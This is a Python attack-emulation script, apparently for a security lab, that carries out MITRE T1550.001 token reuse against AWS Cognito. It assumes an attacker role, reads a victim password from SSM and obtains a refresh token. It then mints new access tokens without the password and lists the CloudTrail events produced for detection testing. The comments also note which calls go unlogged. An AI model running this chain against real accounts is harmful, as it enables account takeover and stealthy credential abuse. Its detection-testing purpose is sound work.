# FILE: attack.py
"""
ATOMIC_COGNITO_REFRESH_TOKEN_REUSE -- Automated Attack Script
T1550.001: Application Access Token Reuse via Cognito REFRESH_TOKEN_AUTH
Phase 1: Token Acquisition (AssumeRole, SSM read, USER_PASSWORD_AUTH)
Phase 2: Application Access Token Reuse (REFRESH_TOKEN_AUTH, GetUser, AdminUserGlobalSignOut)
"""
import sys
import time
import random
import json
import pathlib

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError

# ── Resource names: single source of truth ──────────────────────────────────
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} -- names will fall back to defaults")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json['resources']."""
    return _R.get(key, default)


def _p(infra, semantic_key, default=""):
    """Resolve a dynamic value: pulumi_export_keys maps semantic key -> export key -> infra dict."""
    export_key = _PKS.get(semantic_key, semantic_key)
    return infra.get(export_key) or default


def _step(msg):
    print(f"\n[*] {msg}")

def _ok(msg):
    print(f"[+] {msg}")

def _err(msg):
    print(f"[-] {msg}")

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    time.sleep(random.uniform(5, 15))


def run(outputs: dict, region: str = 'us-east-1') -> None:
    """
    Entry point for the ATOMIC_COGNITO_REFRESH_TOKEN_REUSE emulation.

    Phase 1 -- Token Acquisition:
      Step 1: Assume the pre-provisioned attacker IAM role (CloudTrail: AssumeRole)
      Step 2: Read Cognito pool-id, client-id, victim-password from SSM (CloudTrail: GetParameters)
      Step 3: USER_PASSWORD_AUTH to obtain refresh + access tokens (Cognito data plane only)

    Phase 2 -- Application Access Token Reuse (T1550.001):
      Step 4: REFRESH_TOKEN_AUTH reuse of stolen token -- new access/ID tokens without password
      Step 5: GetUser with new access token -- confirms valid Cognito session
      Step 6: AdminUserGlobalSignOut using lab admin credentials (CloudTrail: AdminUserGlobalSignOut)
    """
    # ------------------------------------------------------------------
    # Resolve resource identifiers
    # Static names from resource_names.json['resources']
    # ------------------------------------------------------------------
    _set_tenant_credentials(outputs)

    param_pool_id_name     = _r('param_pool_id',         '/atomic-cognito-refresh-token-reuse/pool-id')
    param_client_id_name   = _r('param_client_id',       '/atomic-cognito-refresh-token-reuse/client-id')
    param_password_name    = _r('param_victim_password',  '/atomic-cognito-refresh-token-reuse/victim-password')
    victim_username        = _r('victim_username',        'prod.svc.account')

    # Dynamic values from Pulumi outputs via resource_names.json['pulumi_export_keys']
    attacker_role_arn = _p(outputs, 'attacker_role_arn')
    if not attacker_role_arn:
        raise RuntimeError(
            "Missing required output: 'attacker_role_arn' -- ensure the Pulumi stack is deployed"
        )

    # Ambient lab session (seeded_lab_credentials) -- used for Step 1 AssumeRole and Step 6
    lab_session = _base_session(region)

    events_generated = []

    try:
        # ==================================================================
        # PHASE 1: Token Acquisition
        # ==================================================================
        print("\n" + "=" * 60)
        print("[*] PHASE 1: Token Acquisition")
        print("=" * 60)

        # ------------------------------------------------------------------
        # Step 1: Assume attacker IAM role
        # Tradecraft: attacker pivots into a lower-privilege role scoped
        # to Cognito and SSM -- limits blast radius while still providing
        # enough access to steal and reuse the victim refresh token.
        # ------------------------------------------------------------------
        _step("Step 1 - AssumeRole: " + _r('attacker_role_name', 'atomic-cognito-refresh-token-reuse-attacker-role'))
        lab_sts = lab_session.client('sts', region_name=region)
        try:
            assume_resp = lab_sts.assume_role(
                RoleArn=attacker_role_arn,
                RoleSessionName='atomic-cognito-refresh-reuse'
            )
            attacker_creds = assume_resp['Credentials']
            attacker_session = boto3.Session(
                aws_access_key_id=attacker_creds['AccessKeyId'],
                aws_secret_access_key=attacker_creds['SecretAccessKey'],
                aws_session_token=attacker_creds['SessionToken'],
                region_name=region
            )
            _ok(f"AssumeRole succeeded -> session for role {attacker_role_arn}")
            events_generated.append("AssumeRole on atomic-cognito-refresh-token-reuse-attacker-role (CloudTrail)")
        except ClientError as e:
            raise RuntimeError(f"Step 1 AssumeRole failed: {e}")

        op_delay(1, 2)

        # ------------------------------------------------------------------
        # Step 2: Read Cognito parameters from SSM
        # Tradecraft: SSM Parameter Store is a common location for app
        # configuration that inadvertently exposes pool IDs, client IDs,
        # and service-account passwords to roles with ssm:GetParameters.
        # ------------------------------------------------------------------
        _step(f"Step 2 - GetParameters: {param_pool_id_name}, {param_client_id_name}, {param_password_name}")
        attacker_ssm = attacker_session.client('ssm', region_name=region)
        param_names = [param_pool_id_name, param_client_id_name, param_password_name]
        try:
            ssm_resp = attacker_ssm.get_parameters(Names=param_names, WithDecryption=True)
            invalid = ssm_resp.get('InvalidParameters', [])
            if invalid:
                raise RuntimeError(f"SSM parameters not found: {invalid}")
            params = {p['Name']: p['Value'] for p in ssm_resp['Parameters']}
            pool_id        = params.get(param_pool_id_name)
            client_id      = params.get(param_client_id_name)
            victim_password = params.get(param_password_name)
            if not pool_id or not client_id or not victim_password:
                raise RuntimeError(f"One or more SSM parameters missing; resolved: {list(params.keys())}")
            _ok(f"GetParameters succeeded -> pool_id={pool_id}, client_id={client_id}, password=***")
            events_generated.append("GetParameters on /atomic-cognito-refresh-token-reuse/* (CloudTrail)")
        except ClientError as e:
            raise RuntimeError(f"Step 2 GetParameters failed: {e}")

        op_delay(1, 3)

        # ------------------------------------------------------------------
        # Step 3: USER_PASSWORD_AUTH -- obtain initial refresh token
        # Tradecraft: attacker already has the victim's credentials (e.g.
        # harvested from a config file or prior credential dump). This step
        # simulates the initial auth that yields the refresh token the
        # attacker will subsequently reuse in Phase 2.
        # Note: Cognito InitiateAuth is a data-plane call -- it does NOT
        # appear in CloudTrail management events unless advanced security
        # logging is enabled on the user pool.
        # ------------------------------------------------------------------
        _step(f"Step 3 - InitiateAuth USER_PASSWORD_AUTH: {victim_username}")
        attacker_cognito = attacker_session.client('cognito-idp', region_name=region)
        try:
            auth_resp = attacker_cognito.initiate_auth(
                AuthFlow='USER_PASSWORD_AUTH',
                ClientId=client_id,
                AuthParameters={
                    'USERNAME': victim_username,
                    'PASSWORD': victim_password,
                }
            )
            auth_result = auth_resp.get('AuthenticationResult', {})
            refresh_token = auth_result.get('RefreshToken')
            if not refresh_token:
                raise RuntimeError(
                    "USER_PASSWORD_AUTH did not return a RefreshToken -- "
                    "check pool explicitAuthFlows (ALLOW_USER_PASSWORD_AUTH required) "
                    "and that the user is not in FORCE_CHANGE_PASSWORD state"
                )
            _ok("USER_PASSWORD_AUTH succeeded -> refresh token obtained (Cognito data plane)")
            events_generated.append(
                f"Cognito InitiateAuth USER_PASSWORD_AUTH for {victim_username} (data plane only)"
            )
        except ClientError as e:
            code = e.response['Error']['Code']
            if code in ('NotAuthorizedException', 'UserNotFoundException',
                        'UserNotConfirmedException', 'PasswordResetRequiredException'):
                raise RuntimeError(f"Step 3 InitiateAuth auth error ({code}): {e}")
            raise RuntimeError(f"Step 3 InitiateAuth failed: {e}")

        op_delay(2, 5)
        phase_delay()

        # ==================================================================
        # PHASE 2: Application Access Token Reuse (T1550.001)
        # ==================================================================
        print("\n" + "=" * 60)
        print("[*] PHASE 2: Application Access Token Reuse (T1550.001)")
        print("=" * 60)

        # ------------------------------------------------------------------
        # Step 4: REFRESH_TOKEN_AUTH -- core T1550.001 action
        # Tradecraft: the attacker reuses the stolen refresh token to mint
        # a fresh access token and ID token WITHOUT presenting the victim's
        # password. The permissive pool config (MFA=OFF, no revocation,
        # ALLOW_REFRESH_TOKEN_AUTH enabled) allows this with no challenge.
        # Refresh tokens are valid for 30 days -- persistent access window.
        # ------------------------------------------------------------------
        _step("Step 4 - InitiateAuth REFRESH_TOKEN_AUTH: T1550.001 core action")
        try:
            refresh_resp = attacker_cognito.initiate_auth(
                AuthFlow='REFRESH_TOKEN_AUTH',
                ClientId=client_id,
                AuthParameters={
                    'REFRESH_TOKEN': refresh_token,
                }
            )
            refresh_result = refresh_resp.get('AuthenticationResult', {})
            new_access_token = refresh_result.get('AccessToken')
            if not new_access_token:
                raise RuntimeError(
                    "REFRESH_TOKEN_AUTH did not return a new AccessToken -- "
                    "token may have been revoked or pool enableTokenRevocation is true"
                )
            _ok("REFRESH_TOKEN_AUTH succeeded -> new access/ID tokens minted WITHOUT password (T1550.001)")
            _ok(f"Attacker now holds a fully valid Cognito session for {victim_username}")
            events_generated.append(
                f"Cognito InitiateAuth REFRESH_TOKEN_AUTH for {victim_username} (data plane)"
            )
            events_generated.append(
                "New access/ID token minted from stolen refresh token - no password presented"
            )
        except ClientError as e:
            code = e.response['Error']['Code']
            if code == 'NotAuthorizedException':
                raise RuntimeError(
                    f"Step 4 REFRESH_TOKEN_AUTH failed - token invalid or revoked ({code}): {e}"
                )
            raise RuntimeError(f"Step 4 REFRESH_TOKEN_AUTH failed: {e}")

        op_delay(2, 6)

        # ------------------------------------------------------------------
        # Step 5: GetUser -- verify refreshed identity
        # Tradecraft: the attacker confirms the new access token grants a
        # live Cognito session for the victim account. GetUser is the
        # canonical proof-of-access check after a token reuse attack.
        # ------------------------------------------------------------------
        _step("Step 5 - GetUser: verify identity via REFRESH_TOKEN_AUTH access token")
        try:
            user_resp = attacker_cognito.get_user(AccessToken=new_access_token)
            username = user_resp.get('Username', 'unknown')
            user_attrs = {a['Name']: a['Value'] for a in user_resp.get('UserAttributes', [])}
            _ok(f"GetUser succeeded -> username={username}")
            _ok(f"User attributes: {user_attrs}")
            _ok("T1550.001 confirmed: attacker holds valid Cognito session without presenting password")
            events_generated.append(
                "Cognito GetUser with access token from REFRESH_TOKEN_AUTH - no password used (data plane)"
            )
        except ClientError as e:
            code = e.response['Error']['Code']
            if code == 'NotAuthorizedException':
                _err(f"Step 5 GetUser - access token expired or invalid ({code}): {e}")
            else:
                raise RuntimeError(f"Step 5 GetUser failed: {e}")

        op_delay(1, 3)

        # ------------------------------------------------------------------
        # Step 6: AdminUserGlobalSignOut -- simulate defender revocation
        # Tradecraft context: the defender discovers suspicious Cognito
        # activity and revokes all sessions for the victim account. This
        # generates the expected CloudTrail management event that detection
        # rules should fire on.
        #
        # Implementation note: the attacker role has cognito-idp:InitiateAuth
        # but NOT AdminUserGlobalSignOut. We first demonstrate the boundary
        # (expected AccessDenied on the attacker role), then use the ambient
        # lab admin credentials to call it successfully and generate the
        # CloudTrail event. Per client-account safety rules, AccessDenied
        # from a deliberate IAM Deny is treated as success.
        # ------------------------------------------------------------------
        _step("Step 6 - AdminUserGlobalSignOut: simulate defender revocation")

        # Sub-step 6a: attempt as attacker role -- documents permission boundary
        _step("  Step 6a - Attempt as attacker role (expected: AccessDenied)")
        try:
            attacker_cognito.admin_user_global_sign_out(
                UserPoolId=pool_id,
                Username=victim_username
            )
            # This should not succeed -- the attacker role IAM policy should deny it.
            # Per client-account safety rules: if a guarded call unexpectedly succeeds, undo it.
            _err(
                "WARNING: attacker role succeeded on AdminUserGlobalSignOut -- "
                "IAM policy may be misconfigured (attacker role should lack this permission)"
            )
        except ClientError as e:
            code = e.response['Error']['Code']
            if code == 'AccessDeniedException':
                _ok("AccessDenied on attacker role AdminUserGlobalSignOut -- permission boundary confirmed [OK]")
            else:
                _err(f"Unexpected error from attacker role AdminUserGlobalSignOut ({code}): {e}")

        op_delay(2, 4)

        # Sub-step 6b: call as lab admin -- generates CloudTrail management event
        _step("  Step 6b - AdminUserGlobalSignOut as lab admin (CloudTrail management event)")
        lab_cognito = lab_session.client('cognito-idp', region_name=region)
        try:
            lab_cognito.admin_user_global_sign_out(
                UserPoolId=pool_id,
                Username=victim_username
            )
            _ok(f"AdminUserGlobalSignOut succeeded -> all {victim_username} sessions invalidated")
            _ok("CloudTrail management event generated: AdminUserGlobalSignOut")
            events_generated.append(
                f"AdminUserGlobalSignOut for {victim_username} (CloudTrail management event)"
            )
        except ClientError as e:
            code = e.response['Error']['Code']
            if code == 'AccessDeniedException':
                _err(
                    f"Step 6b AdminUserGlobalSignOut denied for lab admin ({code}) -- "
                    f"check that the lab execution role has cognito-idp:AdminUserGlobalSignOut: {e}"
                )
            elif code == 'UserNotFoundException':
                _err(f"Step 6b AdminUserGlobalSignOut - victim user not found ({code}): {e}")
            else:
                raise RuntimeError(f"Step 6b AdminUserGlobalSignOut failed unexpectedly: {e}")

        op_delay(2, 4)

    finally:
        # No attack-created AWS resources to clean up -- all infrastructure is Pulumi-managed.
        # STS sessions and Cognito tokens expire automatically.
        pass

    # ==================================================================
    # Summary
    # ==================================================================
    print("\n" + "=" * 60)
    print("[*] ATOMIC_COGNITO_REFRESH_TOKEN_REUSE -- Emulation Complete")
    print("=" * 60)
    print("[*] Events generated:")
    for i, event in enumerate(events_generated, 1):
        print(f"    {i}. {event}")
    print()
    _ok("Technique T1550.001: Application Access Token reuse via Cognito REFRESH_TOKEN_AUTH")
    _ok("Dwell time recommendation: 120 seconds before running detection validation")
    _ok(
        "CloudTrail management events: AssumeRole, GetParameters, AdminUserGlobalSignOut -- "
        "Cognito data-plane events (InitiateAuth, GetUser) visible only with advanced security logging"
    )
